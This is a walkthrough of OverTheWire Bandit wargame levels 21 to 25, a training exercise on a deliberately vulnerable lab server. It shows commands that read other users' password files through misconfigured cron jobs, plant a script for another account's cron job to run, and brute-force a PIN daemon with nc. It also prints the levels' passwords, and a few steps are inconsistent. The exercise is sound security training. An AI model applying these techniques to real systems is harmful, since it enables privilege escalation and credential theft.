https://overthewire.org/wargames/bandit

  
Bandit  Level 21 → Level 22

https://overthewire.org/wargames/bandit/bandit22.html
ssh bandit21@bandit.labs.overthewire.org -p 2220
pass: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
problem: A program is running automatically at regular intervals
from cron, the time–based job scheduler.
Look in /etc/cron.d/ for the configuration and see
what command is being executed.

Write up:

1. cd /etc/cron.d
2. ls -la
output:
. . .
-rw-r--r-- 1 root root 120 May 7 2020 cronjob_bandit22
. . .
3. cat cronjob_bandit22
output:
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
  a. @reboot   means: Run once after reboot.
  b.  * * * * * means Run at every minute. 
        Execute the shell executable file, cronjob_bandit22.sh, 
          located in the directory /usr/bin/.

4. run cat /usr/bin/cronjob_bandit22.sh
   output:
         #!/bin/bash
         chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
         cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

5. cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
    output:
     Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

     
/dev/null is a special file. Whatever you write to /dev/null
will be discarded.
It’s known as the null device in a UNIX system

 


Bandit  Level 22 → Level  23

https://overthewire.org/wargames/bandit/bandit23.html
ssh bandit22@bandit.labs.overthewire.org -p 2220
pass: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

Problem:A program is running automatically at regular intervals from 
cron, the time-based job scheduler. 
Look in /etc/cron.d/ for the configuration and see what command is 
being executed.
  

Write up: https://dynamicparallax.wordpress.com/2015/09/22/bandit-level-22-%E2%86%92-level-23/

1. ls -l /etc/cron.d/
2. cat /etc/cron.d/cronjob_bandit23
   output:
     reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
     * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null 
  
  We get the output to a file location that runs at 
    /usr/bin/cronjob_bandit23.sh


3. cat /usr/bin/cronjob_bandit23.sh
    output:
       
       #!/bin/bash

       myname=$(whoami)
       mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

       echo "Copying passwordfile /etc/bandit_pass/$myname to 
                                      /tmp/$mytarget"

       cat /etc/bandit_pass/$myname > /tmp/$mytarget


  This script sends the output of a cat  
     on        /etc/bandit_pass/$myname 
     to        /tmp/$mytarget

4. cat /tmp/$mytarget
   output:
       cat: /tmp/: Permission denied

   Looks like the $ may have blocked  our full file location 
   because it only shows /tmp/ in the output. 

5. Step 5.
  run: /usr/bin/cronjob_bandit23.sh
  output:  
         Copying passwordfile /etc/bandit_pass/bandit22 
                 to /tmp/8169b67bd894ddbb4412f91573b38db3

6.  cat /tmp/8169b67bd894ddbb4412f91573b38db3
    output:  
        Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
     This is our current password output. Not what we want.

7. Let’s go back and look at cronjob_bandit23.sh script 
Type /usr/bin/cronjob_bandit23.sh
 output: 
       Copying passwordfile /etc/bandit_pass/bandit22 
       to /tmp/8169b67bd894ddbb4412f91573b38db3 
It says bandit22, but we want bandit23 password. 


8. Let’s look at how the script works again.
   The second part: 
       mytarget=$(echo I am user $myname | md5sum | cut -d ‘ ‘ -f 1) 
  
   $myname is set to bandit22 and we  want bandit23 password.

  Let’s Replace the $myname part with bandit23 instead of letting 
   the script set it to our current uid.
   mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
   
   cat /etc/bandit_pass/bandit23 > /tmp/$mytarget
9. 
   cat /tmp/8ca319486bfbbc3663ea0fbe81326349

  output:
     jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

####################################################


Bandit Level 23 → Level  24

https://overthewire.org/wargames/bandit/bandit24.html
ssh bandit23@bandit.labs.overthewire.org -p 2220
pass: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

Problem: A program is running automatically at regular 
intervals from cron, the time-based job scheduler. 
Look in /etc/cron.d/  

NOTE: This level requires you to create your own first shell-script.
  


Write up:

1. cat /etc/cron.d/cronjob_bandit24
   output:
         @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
         * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
         
2. cat /usr/bin/cronjob_bandit24.sh
   output:
   
   
     #!/bin/bash

     myname=$(whoami)

     cd /var/spool/$myname
     echo "Executing and deleting all scripts in /var/spool/$myname:"
     for i in * .*;
     do
          if [ "$i" != "." -a "$i" != ".." ];
          then
             echo "Handling $i"
             owner="$(stat --format "%U" ./$i)"# Get owner name
             if [ "${owner}" = "bandit23" ]; then
                 timeout -s 9 60 ./$i #  run program for 60 and send signal 9
             fi
             rm -f ./$i    #  remove file ignore nonexistent files
         fi
     done
       
# Every file in the path of 
#   /var/spool/$myname 
#   will be executed once and be deleted  after 60 seconds

3.  Let us try to write a script to fetch the password from
   /etc/bandit_pass/bandit24 and store it to another temporary file.
 First, we create a workspace to work around  
   mkdir -p /tmp/secttp
   cd /tmp/secttp
   touch secttp.sh #  create afil
   chmod 777 secttp.sh
   ls -al secttp.sh
-rwxrwxrwx 1 bandit23 root 68 Mar 26 08:09 secttp.shbandit23@bandit:/tmp/secttp$ vim secttp.sh

4.  vim secttp.sh
    Add next line to secttp.sh
     
     cat /etc/bandit_pass/bandit24 > /tmp/secttp/password
    
5.  Set permission of the password file which  allows everyone
  to write information to the file.
   in /tmp/secttp dir  we run next commands
    a. touch password
    b. chmod 666 password
    c. ls -al password
-rw-rw-rw- 1 bandit23 root 0 Mar 26 08:11 password

6. Copy the script to /var/spool/bandit24 and wait for the script 
   running automatically in a minute.

  cp secttp.sh /var/spool/bandit24/
  
7. Wait 1  minute
   ls -al password
-rw-rw-rw- 1 bandit23 root 33 Mar 26 08:18 password
 cat password
output :UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ


Bandit   Level 24 → Level  25

https://overthewire.org/wargames/bandit/bandit25.html
ssh bandit24@bandit.labs.overthewire.org -p 2220
pass: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
Problem:  
    A daemon is listening on port 30002 and will give you the 
   password for bandit25 if given the password for bandit24 and a 
   secret numeric 4-digit pincode. 
   There is no way to retrieve the pincode except 
   by going through all of the 10000 combinations, called 
   brute-forcing.
Write up:
 1.  nmap -p- localhost       #   Scan all TCP ports
   output :
        Starting Nmap 7.40 ( https://nmap.org ) at 2021-08-05 11:01 CEST
        Nmap scan report for localhost (127.0.0.1)
        Host is up (0.00036s latency).
        Not shown: 65525 closed ports
        PORT      STATE SERVICE
        22/tcp    open  ssh
        113/tcp   open  ident
        30000/tcp open  ndmps
        30001/tcp open  pago-services1
        30002/tcp open  pago-services2
        31046/tcp open  unknown
          ...
 As  you can see  a pago-services2 service is 
       listening on port 30002 in localhost.

4. mkdir /tmp/myBandit24 
   cd    /tmp/myBandit24
   vim  index.sh
5. Add  this script:

    #!/bin/bash
    for i in {0000..9999}; do
       echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i >> combinations.txt
    done 
6.   Type :wq to save changes to file & quit Vim.
7.  chmod +x index.sh
8.   ./index.sh   # to execute the shell script and generate 
     all the possible password combinations.
9. To check the file You can ran :
        head -n 3  combinations.txt
   output :
	UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
	UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
	UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002

10: cat combinations.txt | nc localhost 30002 >> result.txt 
  Sends all the combinations over a single nc connection. 
  The results  of each combinations will be send to the text file 
  named result.txt.
11. sort result.txt | uniq -u 
    output:
     
Correct!
Exiting.
I am the pincode checker for user bandit25. 
 Please enter the password for user bandit24 and the secret pincode 
 on a single line, separated by a space.
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG


Bandit   Level 25 → Level  26

https://overthewire.org/wargames/bandit/bandit26.html
ssh bandit24@bandit.labs.overthewire.org -p 2220
pass: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG 
Problem:  
